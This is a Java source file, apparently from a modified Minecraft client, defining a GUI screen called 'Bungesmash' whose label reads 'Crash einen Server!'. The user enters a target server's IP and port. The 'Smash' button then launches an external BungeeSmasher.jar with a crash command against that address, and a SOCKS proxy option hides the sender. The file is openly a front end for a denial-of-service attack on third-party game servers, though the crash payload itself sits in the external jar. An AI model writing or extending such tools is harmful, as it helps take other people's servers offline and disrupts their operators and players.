package me.bratwurst.news.crash;

import com.ibm.icu.util.Output;
import me.bratwurst.utils.MainUtil;
import net.minecraft.client.gui.*;

import org.lwjgl.input.Keyboard;
import org.lwjgl.opengl.GL11;

import java.io.*;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.nio.Buffer;
import java.nio.charset.StandardCharsets;

public class Bungesmash extends GuiScreen {
    public static Proxy currentProxy = null;
    public static boolean useProxy = false;
    static GuiTextField ip;
    static GuiScreen before;
    private static boolean isRunning;
    private GuiButton button;
    private String status;
    public static String renderText;

    public Bungesmash(GuiScreen before) {
        Bungesmash.before = before;
    }

    @Override
    protected void actionPerformed(GuiButton button) {
        switch (button.id) {
            case 0:
                if (!isRunning) {
                    String[] split = ip.getText().split(":");
                    if (split.length == 2) {
                        currentProxy = Bungesmash.getProxyFromString(ip.getText());
                        this.status = "\u00a76Proxy used " + currentProxy.address().toString();
                        useProxy = true;
                        renderText = "\u00a7cCrashed";
                        isRunning = true;
                        button.displayString = "\u00a7cDisconnect";
                        break;
                    }
                    this.status = "\u00a7cPlease use: <host>:<port>";
                    break;
                }
                isRunning = false;
                button.displayString = "\u00a7aCrash";
                currentProxy = null;
                useProxy = false;
                break;
            case 1:
                mc.displayGuiScreen(new GuiIngameMenu());
                break;

            case 2:
                String[] split = ip.getText().split(":");
                if (split.length == 2) {
                    final String ip = split[0];
                    final String port = split[1];
                    try {
                        final String exe = "java -jar C:\\Users\\Gaming\\AppData\\Roaming\\.minecraft\\God\\Tools\\BungeeSmasher.jar";
                        final Process exec = Runtime.getRuntime().exec(exe + " " + "crash " + ip + ":" + port + " " + "2 200 3");
                        final InputStream inputStream = exec.getInputStream();
                        final OutputStream outputStream = exec.getOutputStream();
                        new Thread(() -> {
                            final BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                            String line;
                            try {
                                outputStream.write(("crash " + ip + ":" + port + " " + "2 200 3").getBytes(StandardCharsets.UTF_8));
                                while ((line = bufferedReader.readLine()) != null) {
                                    MainUtil.SendClientMesage(line);
                                }
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                        }).start();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }


                break;
            case 3:
                String[] splitt = ip.getText().split(":");
                if (splitt.length == 2) {
                    final String ip = splitt[0];
                    final String port = splitt[1];
                    try {
                        final String exe = "java -jar C:\\Users\\Gaming\\AppData\\Roaming\\.minecraft\\God\\Tools\\BungeeSmasher.jar";
                        final Process exec = Runtime.getRuntime().exec(exe + " " + "crash " + ip + ":" + port + " " + "2 200 3");
                        final InputStream inputStream = exec.getInputStream();
                        final OutputStream outputStream = exec.getOutputStream();
                        new Thread(() -> {
                            final BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                            String line;
                            try {
                                exec.destroy();
                                exec.destroyForcibly();
                                outputStream.write((ip + ":" + port + " " + "2 200 3").getBytes(StandardCharsets.UTF_8));
                                while ((line = bufferedReader.readLine()) != null) {
                                    MainUtil.SendClientMesage(line);
                                }
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                        }).start();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }

        }

    }

    public static Proxy getProxyFromString(String proxy) {
        return new Proxy(Proxy.Type.SOCKS, new InetSocketAddress(proxy.split(":")[0], (int) Integer.valueOf(proxy.split(":")[1])));
    }

    @Override
    public void drawScreen(int x, int y, float z) {
        new ScaledResolution(this.mc);
        this.drawDefaultBackground();
        GL11.glPushMatrix();
        GL11.glColor4d((double) 1.0, (double) 1.0, (double) 1.0, (double) 1.0);
        GL11.glScaled((double) 4.0, (double) 4.0, (double) 4.0);
        GuiCrashScreen.drawCenteredString(this.mc.fontRendererObj, renderText, this.width / 8, this.height / 4 - this.mc.fontRendererObj.FONT_HEIGHT, 0);
        GL11.glPopMatrix();
        GuiCrashScreen.drawCenteredString(this.mc.fontRendererObj, this.status, this.width / 2, 20, -1);
        ip.drawTextBox();
        GuiCrashScreen.drawCenteredString(this.mc.fontRendererObj, "\u00a77IP:Port", this.width / 2, 50, -1);
        super.drawScreen(x, y, z);
    }

    @Override
    public void initGui() {
        renderText = "";
        this.buttonList.add(new GuiButton(1, this.width / 2 - 100, this.height / 3 + 90, 200, 20, "Back"));
        this.buttonList.add(new GuiButton(2, this.width / 2 - 100, this.height / 3 + 66, 200, 20, "Smash"));
        this.buttonList.add(new GuiButton(3, this.width / 2 - 100, this.height / 3 + 120, 200, 20, "Stop"));
        ip = new GuiTextField(this.height, this.mc.fontRendererObj, this.width / 2 - 100, 60, 200, 20);
        ip.setMaxStringLength(100);
        ip.setText("");
        this.status = "\u00a7cCrash einen Server!";
        ip.setFocused(true);
        Keyboard.enableRepeatEvents((boolean) true);
    }

    @Override
    protected void keyTyped(char character, int key) {
        try {
            super.keyTyped(character, key);
        } catch (IOException var4) {
            var4.printStackTrace();
        }
        if (character == '\r') {
            this.actionPerformed((GuiButton) this.buttonList.get(0));
        }
        ip.textboxKeyTyped(character, key);
    }

    @Override
    protected void mouseClicked(int x, int y, int button) {
        try {
            super.mouseClicked(x, y, button);
        } catch (IOException var5) {
            var5.printStackTrace();
        }
        ip.mouseClicked(x, y, button);
    }

    @Override
    public void onGuiClosed() {
        Keyboard.enableRepeatEvents((boolean) false);
    }

    @Override
    public void updateScreen() {
        ip.updateCursorCounter();
    }

    static {
        renderText = "";
    }
}



